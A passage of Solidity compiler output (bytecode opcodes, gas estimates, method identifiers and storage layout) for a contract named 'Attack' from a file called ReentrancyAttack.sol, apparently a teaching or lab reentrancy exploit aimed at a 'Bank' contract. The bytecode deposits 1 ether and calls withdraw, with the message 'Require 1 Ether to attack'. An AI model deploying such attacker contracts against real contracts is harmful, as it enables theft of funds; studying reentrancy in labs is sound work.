PUSH2 0x139 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x142 PUSH2 0x169 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14F SWAP2 SWAP1 PUSH2 0x384 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x160 PUSH2 0x18D JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE EQ PUSH2 0x1D7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1CE SWAP1 PUSH2 0x3F7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x245 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x257 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2C1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2D3 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2EB DUP2 PUSH2 0x2D9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x304 PUSH0 DUP4 ADD DUP5 PUSH2 0x2E2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x34C PUSH2 0x347 PUSH2 0x342 DUP5 PUSH2 0x30A JUMP JUMPDEST PUSH2 0x329 JUMP JUMPDEST PUSH2 0x30A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x35D DUP3 PUSH2 0x332 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x36E DUP3 PUSH2 0x353 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x37E DUP2 PUSH2 0x364 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x397 PUSH0 DUP4 ADD DUP5 PUSH2 0x375 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x52657175697265203120457468657220746F2061747461636B00000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x3E1 PUSH1 0x19 DUP4 PUSH2 0x39D JUMP JUMPDEST SWAP2 POP PUSH2 0x3EC DUP3 PUSH2 0x3AD JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x40E DUP2 PUSH2 0x3D5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP1 POP POP SGT 0xCC 0xEF 0xC DUP11 LOG1 0x4B GT PUSH15 0x5FDBE28296A782B5189F115D8CDB40 RETURNDATACOPY LOG4 0xC 0xC6 CODECOPY PUSH5 0x736F6C6343 STOP ADDMOD 0x1E STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "219800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"bank()": "infinite",
						"getBalance()": "312"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"bank()": "76cdb03b",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 73,
						"contract": "contracts/ReentrancyAttack.sol:Attack",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Bank)70"
					}
				],
				"types": {
					"t_contract(Bank)70": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}